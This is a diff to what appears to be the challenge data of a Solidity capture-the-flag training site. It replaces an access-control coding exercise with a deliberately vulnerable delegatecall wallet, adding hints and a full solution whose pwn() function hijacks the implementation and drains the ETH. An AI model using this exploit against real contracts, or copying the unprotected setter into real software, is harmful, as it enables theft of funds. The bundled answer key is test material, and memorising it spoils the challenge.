@@ -46,73 +46,78 @@ function pwn() external payable {
 }`,
   },
   2: {
-    title: 'Access Control',
+    title: 'Improper Access Control',
     tags: ['solidity', 'easy', 'security', 'ctf'],
     points: 100,
-    scenario: 'Complete the AccessControl contract implementation. Implement role-based access control with ADMIN and USER roles.',
+    scenario: 'UpgradeableWallet is an upgradeable contract that uses delegatecall to execute the code of WalletImplementation.',
     vulnerableCode: `// SPDX-License-Identifier: MIT
 pragma solidity 0.8.30;
 
-contract AccessControl {
-    event GrantRole(bytes32 indexed role, address indexed account);
-    event RevokeRole(bytes32 indexed role, address indexed account);
+contract UpgradeableWallet {
+    address public implementation;
+    address public owner;
 
-    mapping(bytes32 => mapping(address => bool)) public roles;
-
-    bytes32 public constant ADMIN = keccak256(abi.encodePacked("ADMIN"));
-
-    function _grantRole(bytes32 role, address account) internal {
-        // Write code here
+    constructor(address _implementation) {
+        implementation = _implementation;
+        owner = msg.sender;
     }
 
-    function grantRole(bytes32 role, address account) external {
-        // Write code here
+    fallback() external payable {
+        (bool executed, ) = implementation.delegatecall(msg.data);
+        require(executed, "failed");
+    }
+}
+
+contract WalletImplementation {
+    address public implementation;
+    address payable public owner;
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "not owner");
+        _;
     }
 
-    function revokeRole(bytes32 role, address account) external {
-        // Write code here
+    receive() external payable {}
+
+    function setImplementation(address _implementation) external {
+        implementation = _implementation;
+    }
+
+    function withdraw() external onlyOwner {
+        owner.transfer(address(this).balance);
     }
 }`,
     tasks: [
       {
         id: 1,
-        description: 'Define a new role named USER, use the keccak256 hash of the string "USER" as an identifier for this role.',
-        completed: false,
-      },
-      {
-        id: 2,
-        description: 'Define modifier named onlyRole(bytes32 role) that checks msg.sender has role before executing the rest of the code.',
-        completed: false,
-      },
-      {
-        id: 3,
-        description: 'Complete function _grantRole. This function will set role for account to true and then emit the event GrantRole.',
-        completed: false,
-      },
-      {
-        id: 4,
-        description: 'Complete the external function grantRole. This function must restrict access only to msg.sender having the ADMIN role.',
-        completed: false,
-      },
-      {
-        id: 5,
-        description: 'Complete the external function revokeRole that will revoke role from account. This function must restrict access only to msg.sender having the ADMIN role.',
-        completed: false,
-      },
-      {
-        id: 6,
-        description: 'Emit the event RevokeRole.',
-        completed: false,
-      },
-      {
-        id: 7,
-        description: 'Grant role ADMIN to msg.sender when this contract is deployed.',
+        description: 'Drain all ETH from UpgradeableWallet. Function pwn will be called to initiate the exploit.',
         completed: false,
       },
     ],
     hints: [
-      'constructor() {\n    _grantRole(ADMIN, msg.sender);\n}',
+      'Anyone can call setImplementation',
+      `function setImplementation(address _implementation) external {
+    implementation = _implementation;
+}`,
+      'Take control of the UpgradeableWallet by setting the implementation to this contract.',
+      'Next withdraw ETH from the wallet into this contract.',
+      'Add a receive() external payable {} to receive ETH from the wallet.',
     ],
+    solution: `receive() external payable {}
+
+function _call(bytes memory data) private {
+    (bool executed, ) = target.call(data);
+    require(executed, "failed");
+}
+
+function pwn() external {
+    _call(abi.encodeWithSignature("setImplementation(address)", address(this)));
+    _call(abi.encodeWithSignature("withdraw()"));
+}
+
+function withdraw() external {
+    payable(msg.sender).transfer(address(this).balance);
+}`,
   },
   3: {
     title: 'Misaligned Storage',
